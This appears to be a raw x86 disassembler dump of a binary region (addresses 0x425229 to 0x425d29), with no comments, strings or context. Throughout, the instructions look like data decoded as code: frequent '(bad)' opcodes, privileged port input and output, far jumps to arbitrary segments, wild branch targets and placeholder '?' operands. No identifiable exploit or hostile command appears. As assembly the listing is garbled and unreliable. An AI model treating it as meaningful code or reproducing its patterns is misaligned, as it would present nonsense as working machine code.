  425229:	out    dx,eax
  42522a:	mov    dh,0x35
  42522c:	pushf  
  42522d:	les    ebx,FWORD PTR [esi-0x1cbc35a0]
  425233:	imul   ebx,DWORD PTR [edi-0x70bdf598],0x31
  42523a:	jp     0x4251c9
  42523c:	pushf  
  42523d:	lahf   
  42523e:	cmc    
  42523f:	push   ebp
  425240:	loope  0x4251ea
  425242:	inc    edx
  425243:	inc    esi
  425244:	out    0x6b,eax
  425246:	out    0xa6,eax
  425248:	inc    esp
  425249:	push   esp
  42524a:	xor    edx,ebx
  42524c:	sbb    BYTE PTR [ecx+0x278c3bc3],0x53
  425253:	(bad)  
  425254:	out    0x24,eax
  425256:	in     al,0x8d
  425258:	pop    DWORD PTR [esi-0x75]
  42525b:	call   0x8976de3
  425260:	inc    edi
  425261:	ret    
  425262:	mul    BYTE PTR [edi-0x4d8a6fde]
  425268:	pop    edx
  425269:	popa   
  42526a:	xor    eax,0xf027cb2c
  42526f:	(bad)  
  425270:	shl    BYTE PTR cs:[esi-0x5e],0x56
  425275:	dec    esp
  425276:	lock jg 0x425263
  425279:	xor    esp,DWORD PTR [esi-0x29]
  42527c:	(bad)  
  42527d:	mov    edi,0xd0a9d284
  425282:	cmp    al,0xd2
  425284:	and    eax,0xbf558fb1
  425289:	fs cs out dx,eax
  42528c:	or     ah,BYTE PTR [esp+ebp*4+0x4435d58d]
  425293:	mov    cl,0x1a
  425295:	rcl    BYTE PTR [esi-0x2f],0xcb
  425299:	adc    ch,cl
  42529b:	fwait
  42529c:	out    dx,al
  42529d:	xchg   esp,eax
  42529e:	push   0xcaf6e815
  4252a3:	sub    al,0xff
  4252a5:	xchg   esp,edi
  4252a7:	sbb    bh,bl
  4252a9:	sbb    BYTE PTR [ecx-0x16eb01fe],cl
  4252af:	mov    ah,0xf8
  4252b1:	sbb    BYTE PTR [ebx-0x116296bf],bl
  4252b7:	xor    bl,BYTE PTR [esi]
  4252b9:	fdiv   DWORD PTR [eax+0x249681e1]
  4252bf:	add    DWORD PTR [ebx+ebx*8],0x0
	...
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz rol eax,1
  425342:	(bad)  
  425344:	ror    BYTE PTR [ecx+eax*1+0xf600],0x0
  42534c:	sub    BYTE PTR [eax-0x5b612e1c],ah
  425352:	jb     0x4252dc
  425354:	mov    dl,0xac
  425356:	jnp    0x42535f
  425358:	and    DWORD PTR [edx],0xe01b979d
  42535e:	das    
  42535f:	adc    al,ch
  425361:	ins    DWORD PTR es:[edi],dx
  425362:	(bad)  
  425363:	jle    0x425355
  425365:	mov    eax,0xb9426c1f
  42536a:	imul   esi,DWORD PTR [ebx+ebp*2],0x22
  42536e:	cs cld 
  425370:	dec    ecx
  425371:	test   DWORD PTR [edx],0x92d6f53c
  425377:	(bad)  
  425378:	std    
  425379:	test   DWORD PTR ds:0x724a2e9a,0x8298f1fa
  425383:	hlt    
  425384:	aaa    
  425385:	test   DWORD PTR [eax-0x21311805],esp
  42538b:	xor    al,0xcb
  42538d:	test   ch,dl
  42538f:	call   0x2d22c179
  425394:	in     eax,dx
  425395:	mov    cx,0xf256
  425399:	xchg   esp,eax
  42539a:	mov    ebp,0x5fe2fc09
  42539f:	or     BYTE PTR [ebx+0x6c],ch
  4253a2:	inc    bl
  4253a4:	xchg   ebp,eax
  4253a5:	in     al,0x10
  4253a7:	outs   dx,BYTE PTR ds:[esi]
  4253a8:	jne    0x42536e
  4253aa:	sbb    ch,BYTE PTR [edi-0x77]
  4253ad:	mov    ebx,0xbf3560b3
  4253b2:	cmp    eax,0x354d76ce
  4253b7:	jge    0x425388
  4253b9:	xlat   BYTE PTR ds:[ebx]
  4253ba:	mov    ds:0xaf74bacc,eax
  4253bf:	jmp    0x425347
  4253c1:	ret    0x9ecb
  4253c4:	std    
  4253c5:	stc    
  4253c6:	cmp    bh,BYTE PTR [ecx+0xf]
  4253c9:	aad    0x10
  4253cb:	xchg   ch,cl
  4253cd:	and    al,0xd
  4253cf:	or     eax,0x847844cf
  4253d4:	jle    0x425430
  4253d6:	adc    edx,edi
  4253d8:	jmp    0xfd25b0c0
  4253dd:	jb     0x4253fa
  4253df:	and    al,0x66
  4253e1:	cmp    ah,BYTE PTR [esi]
  4253e3:	dec    esi
  4253e4:	add    eax,0x150499d8
  4253e9:	mov    cl,dh
  4253eb:	xor    DWORD PTR [ecx+eax*4-0x19683288],ecx
  4253f2:	ja     0x42543f
  4253f4:	pop    es
  4253f5:	inc    esi
  4253f6:	mov    bl,BYTE PTR [ebx+0x7a]
  4253f9:	mov    eax,0xc2f4178f
  4253fe:	cli    
  4253ff:	fld    TBYTE PTR [edi+0x2037e2c6]
  425405:	pusha  
  425406:	mov    edx,0xf51adb36
  42540b:	cmp    bl,bl
  42540d:	sub    DWORD PTR [eax+edx*1-0x207763e8],0x4b
  425415:	shl    BYTE PTR [eax],cl
  425417:	cmc    
  425418:	adc    esi,DWORD PTR [ecx-0x76284c6d]
  42541e:	ficom  DWORD PTR [esi]
  425420:	add    esi,DWORD PTR [edx]
  425422:	fsubr  DWORD PTR [ebp-0x73]
  425425:	jecxz  0x425492
  425427:	adc    eax,0x68735bb1
  42542c:	jl     0x42548d
  42542e:	ret    0xe148
  425431:	call   0x95de:0xd6a96b17
  425438:	js     0x4253c6
  42543a:	test   BYTE PTR [eax-0x5b],0xe0
  42543e:	(bad)  
  42543f:	loopne 0x4253ff
  425441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4254b2:	add    BYTE PTR [eax],al
  4254b4:	loopne 0x425525
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	dec    ebx
  4254c1:	add    al,0x10
  4254c3:	sbb    al,0xb6
  4254c5:	lea    eax,[ecx]
  4254c7:	add    dh,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    dh,bh
  4254cd:	test   eax,0xfe917b79
  4254d2:	arpl   WORD PTR [edx],sp
  4254d4:	and    al,cl
  4254d6:	je     0x42553f
  4254d8:	retf   
  4254d9:	test   DWORD PTR [edx-0x51d7de58],edx
  4254df:	adc    cl,al
  4254e1:	xor    edx,edx
  4254e3:	adc    edi,esi
  4254e5:	js     0x4254c2
  4254e7:	fmul   QWORD PTR [ebp+0x63]
  4254ea:	cmp    ebp,0x7a
  4254ed:	stos   DWORD PTR es:[edi],eax
  4254ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ef:	pusha  
  4254f0:	inc    esp
  4254f1:	ins    BYTE PTR es:[di],dx
  4254f3:	pop    ebp
  4254f4:	lds    edi,FWORD PTR [edi+0x2]
  4254f7:	sub    eax,0xd6daa146
  4254fc:	fmul   QWORD PTR [ebx+0x2657a3c9]
  425502:	jo     0x425548
  425504:	and    esp,DWORD PTR [edi+0x318580ed]
  42550a:	fld    TBYTE PTR [ebx+0x8]
  42550d:	xor    dh,BYTE PTR [esi-0x1e]
  425510:	test   BYTE PTR [eax+0x3e],bl
  425513:	mov    bl,0xbd
  425515:	mov    ah,ch
  425517:	inc    eax
  425518:	jecxz  0x4254c9
  42551a:	outs   dx,DWORD PTR ds:[esi]
  42551b:	push   cs
  42551c:	push   cs
  42551d:	hlt    
  42551e:	out    0x9a,al
  425520:	push   esp
  425521:	pop    ss
  425522:	std    
  425523:	xchg   edx,eax
  425524:	cs push ss
  425526:	dec    edi
  425527:	xor    ch,al
  425529:	sub    eax,0xf47015ff
  42552e:	mov    ch,0xf0
  425530:	in     eax,0x7f
  425532:	iret   
  425533:	test   esi,esi
  425535:	dec    ebp
  425536:	gs clc 
  425538:	pop    edi
  425539:	mov    al,0xe7
  42553b:	pusha  
  42553c:	lods   al,BYTE PTR ds:[esi]
  42553d:	xchg   edi,eax
  42553e:	(bad)  
  42553f:	aam    0xc3
  425541:	pop    ds
  425542:	scas   al,BYTE PTR es:[edi]
  425543:	repz dec esp
  425545:	test   al,0xfb
  425547:	and    bh,dh
  425549:	hlt    
  42554a:	add    DWORD PTR [ebx],esi
  42554c:	sub    DWORD PTR [esp+ecx*4-0x479067de],ebp
  425553:	loope  0x4254d7
  425555:	or     BYTE PTR [ecx+0x52],ah
  425558:	fst    QWORD PTR [edx+0xd]
  42555b:	mov    edi,edi
  42555d:	stc    
  42555e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42555f:	xchg   edx,eax
  425560:	inc    eax
  425561:	imul   ebx,DWORD PTR [ecx],0xffffffa3
  425564:	push   es
  425565:	rcr    DWORD PTR [ebx+0x5a],cl
  425568:	retf   0x694f
  42556b:	rcr    DWORD PTR [esi],1
  42556d:	push   esp
  42556e:	push   ds
  42556f:	sub    bh,BYTE PTR [esi-0x48957b61]
  425575:	mov    al,ds:0x56692a50
  42557a:	sbb    bl,BYTE PTR [esi+0x5a]
  42557d:	cmp    BYTE PTR [edi-0x12317179],cl
  425583:	adc    bl,BYTE PTR [edi+0x5a]
  425586:	jno    0x42558b
  425588:	adc    bl,bl
  42558a:	or     BYTE PTR [edi+0x42],bl
  42558d:	sbb    bl,0xae
  425590:	push   esi
  425591:	(bad)  
  425592:	arpl   WORD PTR [edx-0x779c7be],cx
  425598:	aam    0x1a
  42559a:	sub    ebx,DWORD PTR [ebp+0x30]
  42559d:	fsub   QWORD PTR [edx]
  42559f:	int    0x19
  4255a1:	mov    ch,0x5b
  4255a3:	outs   dx,BYTE PTR ds:[esi]
  4255a4:	hlt    
  4255a5:	mov    al,ds:0x32c1bc33
  4255aa:	loop   0x42561e
  4255ac:	pop    ds
  4255ad:	cmp    BYTE PTR [esi+0x1405419f],bl
  4255b3:	or     al,0xd9
  4255b5:	mov    dh,0xda
  4255b7:	enter  0xc186,0x88
  4255bb:	lods   al,BYTE PTR ds:[esi]
  4255bc:	push   esp
  4255bd:	scas   al,BYTE PTR es:[edi]
  4255be:	cmp    BYTE PTR [ebp+0xab12],al
	...
  425634:	mov    esp,0xfefffc92
  425639:	(bad)  
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	test   eax,0xac53e05a
  425645:	mov    es,WORD PTR [ecx]
  425647:	add    dh,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [ebx+0x42f3717e],al
  425651:	sub    DWORD PTR [eax+edi*1+0x54d289be],eax
  425658:	or     esp,ebx
  42565a:	aas    
  42565b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42565c:	ds pushf 
  42565e:	push   esi
  42565f:	inc    ebx
  425660:	mov    eax,ds:0x4ee46e12
  425665:	sub    ebp,eax
  425667:	push   es
  425668:	jb     0x425601
  42566a:	xor    al,0x1f
  42566c:	add    ebp,ecx
  42566e:	sub    eax,0x81f8aade
  425673:	dec    esi
  425674:	sub    dl,BYTE PTR [ecx-0x2e]
  425677:	shr    BYTE PTR [edx+0x59],0x77
  42567b:	xchg   DWORD PTR [ebp+0x6248806b],eax
  425681:	mov    cl,0xf5
  425683:	dec    ecx
  425684:	int3   
  425685:	dec    ebp
  425686:	les    esp,FWORD PTR [edx]
  425688:	xor    al,0x20
  42568a:	and    BYTE PTR [esp+eiz*2-0x5f9376a8],0x46
  425692:	dec    DWORD PTR [edx]
  425694:	jo     0x4256f8
  425696:	nop
  425697:	repnz test al,0xd8
  42569a:	push   ebp
  42569b:	and    eax,0x13019edf
  4256a0:	adc    eax,0xda9cb471
  4256a5:	mov    edi,0xc8547165
  4256aa:	xchg   ebp,eax
  4256ab:	test   DWORD PTR [ebx+0x1c],0x60a5c3d5
  4256b2:	and    BYTE PTR [eax+0x6bfe489],0xf2
  4256b9:	jne    0x4256bd
  4256bb:	test   eax,0x9f74f80
  4256c0:	out    0x1c,eax
  4256c2:	pop    ebx
  4256c3:	into   
  4256c4:	pop    ebx
  4256c5:	dec    edx
  4256c6:	mov    dh,0x95
  4256c8:	retf   0x63d4
  4256cb:	mov    ebx,0xf3549db1
  4256d0:	inc    edi
  4256d1:	mov    WORD PTR [ecx-0x51e3aae7],?
  4256d7:	push   edx
  4256d8:	imul   ch
  4256da:	push   esp
  4256db:	call   0xe0fc:0x70f82096
  4256e2:	adc    DWORD PTR [ebx+0x1965c1fc],0xffffffbb
  4256e9:	les    ecx,FWORD PTR [edx]
  4256eb:	dec    esi
  4256ec:	push   cs
  4256ed:	dec    edx
  4256ee:	xlat   BYTE PTR ds:[ebx]
  4256ef:	and    BYTE PTR [edx+0x21],bh
  4256f2:	push   0xae4057d9
  4256f7:	xlat   BYTE PTR ds:[ebx]
  4256f8:	adc    eax,0xfa7364db
  4256fd:	es sub ch,dl
  425700:	cs mov al,0xf
  425703:	cmp    al,BYTE PTR [esi+0x6e]
  425706:	scas   al,BYTE PTR es:[edi]
  425707:	sbb    al,0x4c
  425709:	xchg   bh,ch
  42570b:	hlt    
  42570c:	cmp    al,0x14
  42570e:	(bad)  
  42570f:	jmp    0xcba0b865
  425714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425715:	fcomp  DWORD PTR [ebx+0x2013e1c8]
  42571b:	loop   0x425772
  42571d:	pop    ebp
  42571e:	mov    dh,0x79
  425720:	jmp    DWORD PTR [eax]
  425722:	pop    si
  425724:	sub    eax,0xcbbf818b
  425729:	mov    ch,0x20
  42572b:	imul   esi,DWORD PTR [edi],0x1674919a
  425731:	xchg   esi,eax
  425732:	call   FWORD PTR [ecx]
  425734:	jae    0x42579a
  425736:	xlat   BYTE PTR ds:[ebx]
  425737:	xchg   ebx,eax
  425738:	imul   ebx,DWORD PTR [edx],0xa91b3567
  42573e:	xchg   esp,eax
  42573f:	push   edx
  425740:	push   edi
  425741:	jae    0x425743
	...
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	lds    esp,FWORD PTR [esi-0x7c]
  4257c3:	sub    esp,DWORD PTR [edx-0x9fffe71]
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [edx],bl
  4257cd:	fst    DWORD PTR [ebx]
  4257cf:	out    0x2,al
  4257d1:	fucom  st(0)
  4257d3:	clc    
  4257d4:	ins    BYTE PTR es:[edi],dx
  4257d5:	cmp    DWORD PTR [ebx],edx
  4257d7:	jmp    0x58c2:0x7ede835e
  4257de:	repz pusha 
  4257e0:	or     al,0xe
  4257e2:	cmp    al,al
  4257e4:	sub    esp,DWORD PTR [esi+0x4f]
  4257e7:	iret   
  4257e8:	call   0x1572b852
  4257ed:	mov    esi,0x147bc54a
  4257f2:	sub    ch,bh
  4257f4:	push   0x6ae068d3
  4257f9:	(bad)  
  4257fa:	imul   ebp,DWORD PTR [ebp+0x1b],0x51
  4257fe:	stc    
  4257ff:	loopne 0x42584e
  425801:	mov    ds:0xe7d69ca0,eax
  425806:	lds    esp,FWORD PTR [ebx+ebx*1-0x4e]
  42580a:	inc    ecx
  42580b:	pop    ebp
  42580c:	cmp    DWORD PTR [esi+0x41af314f],0xffffffb9
  425813:	js     0x42584f
  425815:	jo     0x425846
  425817:	les    ebp,FWORD PTR [ecx+0x42]
  42581a:	cmp    DWORD PTR [ebx-0x3d474a13],edx
  425820:	int    0x9d
  425822:	add    al,0xdd
  425824:	sbb    ch,BYTE PTR [edx]
  425826:	pop    ebx
  425827:	dec    edi
  425829:	xchg   edx,eax
  42582a:	mov    DWORD PTR [ebp-0x78],esp
  42582d:	mov    bl,0xbf
  42582f:	and    edi,DWORD PTR [eax-0x60]
  425832:	sub    eax,0xba75fa87
  425837:	jmp    0x4257ba
  425839:	aaa    
  42583a:	aad    0x23
  42583c:	jg     0x4258b9
  42583e:	xchg   esp,eax
  42583f:	scas   eax,DWORD PTR es:[edi]
  425840:	es jmp 0x65f37944
  425846:	mov    edi,ebx
  425848:	sub    al,BYTE PTR [eax]
  42584a:	add    BYTE PTR [ebx+0x51],ah
  42584d:	sub    eax,0xeb76f590
  425852:	(bad)  
  425853:	loopne 0x425897
  425855:	fst    QWORD PTR [eax]
  425857:	in     al,dx
  425858:	push   edi
  425859:	mov    ?,eax
  42585b:	push   esi
  42585c:	stos   DWORD PTR es:[edi],eax
  42585d:	pushf  
  42585e:	popf   
  42585f:	xchg   ecx,eax
  425860:	dec    edx
  425861:	jg     0x4258bd
  425863:	lods   al,BYTE PTR ds:[esi]
  425864:	loopne 0x425867
  425866:	cmp    BYTE PTR [edx+0x1df9bbc9],ch
  42586c:	xor    ebx,edx
  42586e:	int    0x44
  425870:	imul   edi,edx,0x30
  425873:	js     0x4258f1
  425875:	and    al,ah
  425877:	inc    esp
  425878:	pop    esp
  425879:	data16 add al,0xd4
  42587c:	jno    0x42589b
  42587e:	pop    eax
  42587f:	sbb    bl,BYTE PTR [esi]
  425881:	fsubr  st,st(5)
  425883:	jecxz  0x425807
  425885:	xchg   ebx,eax
  425886:	dec    eax
  425887:	js     0x4258b9
  425889:	inc    edx
  42588a:	xchg   esi,eax
  42588b:	ror    BYTE PTR [esi+0xf],0x93
  42588f:	(bad)  
  425890:	std    
  425891:	xchg   edi,eax
  425892:	mov    cl,0xe8
  425894:	std    
  425895:	jo     0x42586c
  425897:	inc    eax
  425898:	sbb    esp,DWORD PTR [ecx+0x1a443692]
  42589e:	dec    esi
  42589f:	pavgw  mm4,QWORD PTR [ebx-0x66]
  4258a3:	mov    ah,0x32
  4258a5:	jl     0x4258d7
  4258a7:	or     bh,BYTE PTR [edi-0x54]
  4258aa:	loop   0x42583e
  4258ac:	lock pop edx
  4258ae:	inc    ebp
  4258af:	jo     0x42590b
  4258b1:	inc    ebx
  4258b2:	imul   esp,DWORD PTR [esi],0xffffff99
  4258b5:	test   BYTE PTR [ebx],ah
  4258b7:	cmp    ch,al
  4258b9:	and    cl,BYTE PTR [ebx]
  4258bb:	and    BYTE PTR [edi-0x26],bl
  4258be:	fld    QWORD PTR [ecx]
  4258c0:	and    eax,0x42
	...
  425931:	add    BYTE PTR [eax],al
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	mov    dl,0x63
  425942:	aas    
  425943:	dec    eax
  425944:	cwde   
  425945:	nop
  425946:	add    DWORD PTR [eax],eax
  425948:	test   BYTE PTR [eax],0x0
  42594b:	add    BYTE PTR [esi+eax*8-0x26],ch
  42594f:	es add ebx,esi
  425952:	dec    eax
  425953:	pop    esp
  425954:	mov    al,ds:0x3680ce03
  425959:	xchg   edx,eax
  42595a:	push   ebx
  42595b:	mov    dl,0xfb
  42595d:	lods   eax,DWORD PTR ds:[esi]
  42595e:	bound  ecx,QWORD PTR [ebx]
  425960:	icebp  
  425961:	push   0xea57abc1
  425966:	mov    bh,BYTE PTR [eax+0x6723703b]
  42596c:	add    eax,0x33c713fa
  425971:	add    al,0xf5
  425973:	xchg   esp,eax
  425974:	and    eax,ebp
  425976:	mov    edi,ecx
  425978:	repz xor cl,BYTE PTR [ecx-0x3]
  42597c:	inc    esi
  42597d:	xor    BYTE PTR [edx],0x69
  425980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425981:	inc    edx
  425982:	fst    QWORD PTR [esp+edi*2-0x59300695]
  425989:	aas    
  42598a:	xchg   esi,eax
  42598b:	mov    edx,0x6e91ead5
  425990:	shr    BYTE PTR [ebx*1+0x36a5072a],cl
  425997:	ror    BYTE PTR cs:[ebx+0x7a4b33a3],cl
  42599e:	inc    esp
  42599f:	xor    eax,0xb4b5ad05
  4259a4:	or     al,0x1f
  4259a6:	add    bl,BYTE PTR [ecx]
  4259a8:	fild   DWORD PTR [esp]
  4259ab:	cwde   
  4259ac:	jg     0x425969
  4259ae:	sahf   
  4259af:	nop
  4259b0:	xchg   DWORD PTR [esi-0x9ca9750],edi
  4259b6:	out    dx,al
  4259b7:	aad    0xc9
  4259b9:	push   ss
  4259ba:	jo     0x425948
  4259bc:	push   edx
  4259bd:	(bad)  
  4259bf:	out    0x3e,eax
  4259c1:	sbb    al,0xef
  4259c3:	dec    edx
  4259c4:	fcmovu st,st(6)
  4259c6:	loop   0x425a2f
  4259c8:	in     al,dx
  4259c9:	mov    edi,0xc74cac81
  4259ce:	(bad)  
  4259cf:	dec    edi
  4259d0:	call   FWORD PTR [ebx-0x4e]
  4259d3:	sub    BYTE PTR [esi],0xc0
  4259d6:	(bad)  
  4259d7:	sbb    eax,0x9d4ae636
  4259dc:	mov    ebx,0x90a00a6
  4259e1:	std    
  4259e2:	enter  0x618c,0x4c
  4259e6:	mov    ch,0xdd
  4259e8:	push   0x23
  4259ea:	out    dx,al
  4259eb:	aas    
  4259ec:	and    eax,0x8d119edc
  4259f1:	push   0x60
  4259f3:	cmp    bl,bl
  4259f5:	add    al,0x4c
  4259f7:	test   eax,0x8249dca7
  4259fc:	jge    0x4259e6
  4259fe:	cmp    bh,dh
  425a00:	push   esi
  425a01:	lods   eax,DWORD PTR ds:[esi]
  425a02:	bnd ja 0x425987
  425a05:	ins    DWORD PTR es:[edi],dx
  425a06:	js     0x425a4f
  425a08:	mov    cl,0x4a
  425a0a:	out    0x53,eax
  425a0c:	(bad)  
  425a0d:	clc    
  425a0e:	adc    esp,DWORD PTR [ebp-0x604040e9]
  425a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a15:	jmp    FWORD PTR [ebx]
  425a17:	add    esp,ebx
  425a19:	jb     0x425a3d
  425a1b:	inc    edi
  425a1c:	dec    edx
  425a1d:	push   0x62
  425a1f:	lahf   
  425a20:	sub    edx,DWORD PTR [ebx+esi*1+0x5c]
  425a24:	cdq    
  425a25:	or     edi,DWORD PTR [ebx]
  425a27:	shr    DWORD PTR [ebx-0x6f],cl
  425a2a:	dec    ebx
  425a2b:	or     DWORD PTR [esp+ebp*1],0xaf1b6e74
  425a32:	mov    esi,0xfae2b450
  425a37:	or     eax,0xebff6a63
  425a3c:	xchg   edx,eax
  425a3d:	ins    DWORD PTR es:[edi],dx
  425a3e:	push   edi
  425a3f:	arpl   WORD PTR [ecx+eax*4],si
	...
  425ab2:	add    BYTE PTR [eax],al
  425ab4:	push   es
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	fwait
  425ac1:	ret    0xfcc0
  425ac4:	mov    ss,WORD PTR [ecx+0xf60001]
  425aca:	add    BYTE PTR [eax],al
  425acc:	and    al,0x43
  425ace:	push   0xe16f871c
  425ad3:	lock int3 
  425ad5:	cdq    
  425ad6:	(bad)  
  425ad7:	fadd   QWORD PTR [edx-0x31]
  425ada:	fidivr DWORD PTR ss:[esi-0x458c64ad]
  425ae1:	mov    esi,DWORD PTR [eax]
  425ae3:	dec    ebp
  425ae4:	dec    esp
  425ae5:	and    DWORD PTR [ebp*8+0x40357e33],edi
  425aec:	xchg   esp,eax
  425aed:	imul   ebx,ecx,0xe20055b8
  425af3:	sar    DWORD PTR [ecx+0x45d4f18b],0xd1
  425afa:	mov    bl,0xe7
  425afc:	shl    DWORD PTR [edi],0x34
  425aff:	cld    
  425b00:	pop    ebx
  425b01:	jnp    0x425b5e
  425b03:	(bad)  
  425b04:	in     eax,dx
  425b05:	std    
  425b06:	mov    ch,BYTE PTR [eax-0x4d22457]
  425b0c:	mov    ds:0x2f5efccd,al
  425b11:	push   ds
  425b12:	dec    edi
  425b13:	mov    al,ds:0x43d46b42
  425b18:	arpl   WORD PTR ds:0x3328073,sp
  425b1e:	popf   
  425b1f:	adc    DWORD PTR [eax+0x10],ebx
  425b22:	test   al,0xee
  425b24:	add    ebp,ebp
  425b26:	mov    eax,DWORD PTR [ebp-0x27]
  425b29:	pop    es
  425b2a:	inc    ebp
  425b2b:	sub    eax,0xc8c9c69e
  425b30:	test   al,0xa0
  425b32:	jo     0x425b73
  425b34:	lock xor BYTE PTR [ebx],bl
  425b37:	jmp    0xa125:0x61d93182
  425b3e:	in     eax,dx
  425b3f:	add    cl,bl
  425b41:	ficom  DWORD PTR [ebp+0x6e9ade5a]
  425b47:	lds    esp,FWORD PTR [eax+0x583367b1]
  425b4d:	and    ebp,esp
  425b4f:	push   0xffffffec
  425b51:	fstp   TBYTE PTR [esi+0xa6f0744]
  425b57:	gs retf 0x541
  425b5b:	mov    ah,0xf
  425b5d:	out    0x76,eax
  425b5f:	cld    
  425b60:	sar    ebx,cl
  425b62:	cmove  ecx,DWORD PTR [esi+0x4a]
  425b66:	rcr    DWORD PTR [edi+0x2],cl
  425b69:	out    0x44,al
  425b6b:	iret   
  425b6c:	pusha  
  425b6d:	sbb    al,al
  425b6f:	jns    0x425bd4
  425b71:	sbb    esi,esp
  425b73:	int    0x5
  425b75:	aad    0xf3
  425b77:	les    ecx,FWORD PTR [esi-0x3fdd7dc0]
  425b7d:	repz jb 0x425b0b
  425b80:	out    dx,al
  425b81:	(bad)  
  425b82:	outs   dx,DWORD PTR ds:[esi]
  425b83:	ret    0xdbad
  425b86:	mov    dh,0x5
  425b88:	test   DWORD PTR [ecx-0x10762b55],esi
  425b8e:	ror    DWORD PTR [eax],0x17
  425b91:	sub    edx,DWORD PTR [ebx+0x1d12b13c]
  425b97:	jp     0x425b49
  425b99:	jbe    0x425bc1
  425b9b:	or     eax,0x1a9f1642
  425ba0:	cli    
  425ba1:	cmp    esp,ebx
  425ba3:	sahf   
  425ba4:	jp     0x425b69
  425ba6:	mov    ebp,fs
  425ba8:	xchg   esi,eax
  425ba9:	sar    esp,cl
  425bab:	out    0xd3,al
  425bad:	jnp    0x425bbd
  425baf:	jg     0x425bea
  425bb1:	jmp    0x425ba2
  425bb3:	hlt    
  425bb4:	imul   esp,DWORD PTR [esi-0x59],0x31b85ee
  425bbb:	sti    
  425bbc:	cld    
  425bbd:	or     esp,DWORD PTR [ebp+0x17]
  425bc0:	inc    edi
  425bc1:	dec    eax
	...
  425c32:	add    BYTE PTR [eax],al
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x9284:0xd28f071e
  425c46:	add    DWORD PTR [eax],eax
  425c48:	test   BYTE PTR [eax],0x0
  425c4b:	add    BYTE PTR [ebx-0x308d9916],dh
  425c51:	sub    esi,DWORD PTR [edx+0x6a]
  425c54:	out    dx,al
  425c55:	sbb    al,0x93
  425c57:	mov    ecx,0xcbf9054c
  425c5c:	retf   
  425c5d:	ret    
  425c5e:	cli    
  425c5f:	test   al,0x97
  425c61:	mov    edx,0x37c8bd64
  425c66:	loopne 0x425cb5
  425c68:	sbb    cl,BYTE PTR [esi+0x17]
  425c6b:	pop    es
  425c6c:	mov    ah,0x0
  425c6e:	cmp    BYTE PTR [edi],dl
  425c70:	pop    ebp
  425c71:	add    eax,0x829fdd0c
  425c76:	push   eax
  425c77:	js     0x425c6f
  425c79:	sub    DWORD PTR [ebp-0x22203dcf],esp
  425c7f:	btc    DWORD PTR [ecx+0x62],esp
  425c83:	idiv   DWORD PTR [esi+0x37df64ec]
  425c89:	mov    ebx,0xe6d6cff0
  425c8e:	aas    
  425c8f:	nop
  425c90:	arpl   WORD PTR [ecx-0x6f],si
  425c93:	loop   0x425cca
  425c95:	xlat   BYTE PTR ds:[ebx]
  425c96:	pop    ebp
  425c97:	(bad)  
  425c99:	(bad)  
  425c9a:	js     0x425c32
  425c9c:	dec    eax
  425c9d:	ret    0x446c
  425ca0:	sbb    BYTE PTR [eax+0x1e],0xd0
  425ca4:	push   ebx
  425ca5:	iret   
  425ca6:	hlt    
  425ca7:	jns    0x425c87
  425ca9:	enter  0x20d2,0x66
  425cad:	jge    0x425d08
  425caf:	push   0x8d4300f0
  425cb4:	ss in  al,dx
  425cb6:	and    eax,0x5e70b19b
  425cbb:	jmp    0x483c:0x20e10c8c
  425cc2:	aas    
  425cc3:	rcr    BYTE PTR [edi],0xec
  425cc6:	xor    eax,0x918cb877
  425ccb:	mov    esp,0x48dae698
  425cd0:	in     eax,0x57
  425cd2:	pushf  
  425cd3:	jl     0x425d2d
  425cd5:	stos   BYTE PTR es:[edi],al
  425cd6:	out    dx,eax
  425cd7:	mov    ah,0x70
  425cd9:	imul   ecx,DWORD PTR [edx+0x65599d3f],0xbc65002f
  425ce3:	sub    edx,DWORD PTR [eax-0x52]
  425ce6:	mov    al,0xf1
  425ce8:	xchg   DWORD PTR [eax+edi*8],edx
  425ceb:	xchg   DWORD PTR [edi+0xa8f1a33],ebx
  425cf1:	daa    
  425cf2:	retf   
  425cf3:	es pop ss
  425cf5:	push   0xb8bde0da
  425cfa:	popa   
  425cfb:	push   ebx
  425cfc:	lds    eax,FWORD PTR [eax-0x46880957]
  425d02:	int    0xae
  425d04:	xchg   BYTE PTR [edi-0x40],ah
  425d07:	inc    eax
  425d08:	jmp    edi
  425d0a:	mov    ecx,0x660ea530
  425d0f:	popf   
  425d10:	dec    edx
  425d11:	push   cs
  425d12:	jne    0x425d2c
  425d14:	sub    eax,0x9ef25937
  425d19:	or     al,0x5e
  425d1b:	loopne 0x425d60
  425d1d:	mov    ds:0x40ac4225,eax
  425d22:	xchg   ebx,eax
  425d23:	mov    cs,WORD PTR [esi-0x66]
  425d26:	jo     0x425d6e
  425d28:	retf   
  425d29:	ds jge 0x425cbd
